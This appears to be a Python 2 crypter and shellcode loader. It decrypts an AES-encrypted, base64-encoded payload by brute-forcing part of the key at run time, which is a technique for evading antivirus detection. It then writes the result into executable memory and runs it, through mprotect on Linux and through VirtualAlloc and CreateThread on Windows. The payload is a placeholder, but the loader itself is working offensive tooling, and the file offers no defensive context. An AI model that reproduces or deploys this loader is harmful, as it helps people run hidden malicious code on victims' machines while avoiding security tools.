from ctypes import *
import ctypes
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Random import random
import base64
import os
import sys

def force_shell(encoded):
    # the block size for the cipher object; must be 16, 24, or 32 for AES
    BLOCK_SIZE = 16
    BRUTE_LENGTH = 5

    # the character used for padding--with a block cipher such as AES, the value
    # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
    # used to ensure that your value is always a multiple of BLOCK_SIZE
    PADDING = '\x00'

    # one-liner to sufficiently pad the text to be encrypted
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

    # one-liners to encrypt/encode and decrypt/decode a string
    # encrypt with AES, encode with base64
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
    decoded = ''
    #i = 0
    brute = 0
    encoded = base64.b64decode(encoded)
    print encoded
    check2 = encoded[-BLOCK_SIZE:]
    #print check2
    encoded = encoded[:-BLOCK_SIZE]
    rcontrol = encoded[-(BLOCK_SIZE):]

    encoded = encoded[:-(BLOCK_SIZE)]

    known_secret = encoded[-(BLOCK_SIZE - BRUTE_LENGTH):]

    encoded = encoded[:-(BLOCK_SIZE - BRUTE_LENGTH)]

    decoded2 = ''
    while decoded2 != check2:
	#tmppass = secret[:BLOCK_SIZE-7] + str(brute) + '0'*(7 - len(str(brute)))
	tmppass = known_secret + str(brute) + '0'*(BRUTE_LENGTH - len(str(brute)))
    
	try:
	    cipher2 = AES.new(tmppass)
	except:
	    print tmppass
	    print len(tmppass)
	    sys.exit(1)
	decoded2 = cipher2.decrypt(rcontrol)
	brute += 1
    decoded = DecodeAES(cipher2, encoded)
    print decoded
    return decoded

def executable_code(buffer):
    """Return a pointer to a page-aligned executable buffer filled in with the data of the string provided.
    The pointer should be freed with libc.free() when finished"""
    
    # Some constants
    PROT_READ = 1
    PROT_WRITE = 2
    PROT_EXEC = 4

    buf = c_char_p(buffer)
    size = len(buffer)
    # Need to align to a page boundary, so use valloc
    addr = libc.valloc(size)
    addr = c_void_p(addr)

    if 0 == addr:  
        raise Exception("Failed to allocate memory")

    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr


linux_plat = ['linux','linux2']
win_plat = ['win32']

if sys.platform in linux_plat:
    libc = CDLL('libc.so.6')
elif sys.platform in win_plat:
    VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
    VirtualProtect = ctypes.windll.kernel32.VirtualProtect
    CreateThread = ctypes.windll.kernel32.CreateThread
    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
    WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject

#"## SHELL HERE ##"
CRYPTSHELL = "INSERT CRYPTED AND BASE64'D SHELLCODE HERE"
shellcode = force_shell(CRYPTSHELL)
print CRYPTSHELL
print shellcode

if sys.platform in linux_plat:
    memorywithshell = executable_code(shellcode)
    shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
    shell()
elif sys.platform in win_plat:
    shellcode = bytearray(shellcode)
    memorywithshell = VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    old = ctypes.c_long(1)
    VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
    RtlMoveMemory(ctypes.c_int(memorywithshell),buf,ctypes.c_int(len(shellcode)))
    ht = CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(memorywithshell),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

